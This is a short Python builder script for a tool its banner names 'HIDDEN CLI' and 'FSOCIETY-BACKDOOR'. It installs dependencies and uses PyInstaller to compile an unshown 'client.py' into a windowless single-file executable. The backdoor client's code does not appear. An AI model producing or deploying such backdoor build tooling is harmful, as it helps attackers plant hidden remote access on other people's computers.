import os
from pystyle import *
from os import system as s
from colorama import *
from time import sleep as t
import shutil

Black = '\033[1;30m'  # Black
Red = '\033[1;31m'  # Red
Green = '\033[1;32m'  # Green
Yellow = '\033[1;33m'  # Yellow
Blue = '\033[1;34m'  # Blue
Purple = '\033[1;35m'  # Purple
Cyan = '\033[1;36m'  # Cyan
White = '\033[1;37m'  # White

s('cls')

intro = """
                 .,lx0XWMMMMMMWNKko:.                 
              .l0MMMMMMMMMMMMMMMMMMMMXo.              
            .dWMMMMMMMMMMMMMMMMMMMMMMMMWd.            
            KMMMMMMMMMMMMMMMMMMMMMMMMMMMMK            
            lkMMMMNXXWMMMMMMMMMMWXXNMMMMOl            
            '.xO:;ll. .oXMMMMXo' .cl;:OO.,            
            ,.:ONMMMWO;. .NW.  ;kWMMMNOl.;            
           .cOWd0MNxllxXk0MMKkXxllxNMOdWOc.           
           :MMMlWK.    ,M00MxM;    .KNlMMM:       ____________    
           kMMMMXOXWWKx0XlXMlO0xKWWXOXMMMMk     --|HIDDEN CLI|___       
           0MMO;KMMMMMMdOMMMMXcWMMMMMX:OMM0    |FSOCIETY-BACKDOOR|
           OMc .WMMMWKx;lXMM0l,d0WMMMN. cMO    -------------------       
           :N   .,,'.    .,'     .';,.  .M:           
            lc                         .xo            
             .kxoccc;..,,',,,;,..,cclox0'             
              .WMMMMMk,        'dWMMMMM,              
               KMMMMMMMNOxddx0NMMMMMMMK               
               'NMMMMMMMMMMMMMMMMMMMMM:               
                .OMMMMMMMMMMMMMMMMMMK,                
                  ,kMMMMMMMMMMMMMMO;                  
                    .lkKNMMMMWXOl.                    

                > Press Enter                                         

"""

Anime.Fade(Center.Center(intro), Colors.black_to_red, Colorate.Vertical, interval=0.1, enter=True)

print(f"""{Fore.LIGHTRED_EX}
██╗  ██╗██╗██████╗ ██████╗ ███████╗███╗   ██╗       ██████╗██╗     ██╗
██║  ██║██║██╔══██╗██╔══██╗██╔════╝████╗  ██║      ██╔════╝██║     ██║
███████║██║██║  ██║██║  ██║█████╗  ██╔██╗ ██║█████╗██║     ██║     ██║
██╔══██║██║██║  ██║██║  ██║██╔══╝  ██║╚██╗██║╚════╝██║     ██║     ██║
██║  ██║██║██████╔╝██████╔╝███████╗██║ ╚████║      ╚██████╗███████╗██║
╚═╝  ╚═╝╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝       ╚═════╝╚══════╝╚═╝

                 Welcome to builder

""")

t(2)


def main():
    dirs_to_delete = ['dist', 'build']

    s('pip install -r requirements.txt')
    s('pyinstaller --noconfirm --onefile --windowed --icon hiddenCli.ico --name "hiddenCliBuild"  "HiddenSources\\client.py"')

    s(r'cls & move dist\hiddenCliBuild.exe builded')
    for dir_name in dirs_to_delete:
        shutil.rmtree(dir_name)
    os.remove('hiddenCliBuild.spec')
    s('cls')
    print(f'{Green}\n{intro}\n'
          f'{Green}You build is builded/hiddenCliBuild.exe!')
    input('> Press Enter  ')


if __name__ == '__main__':
    main()
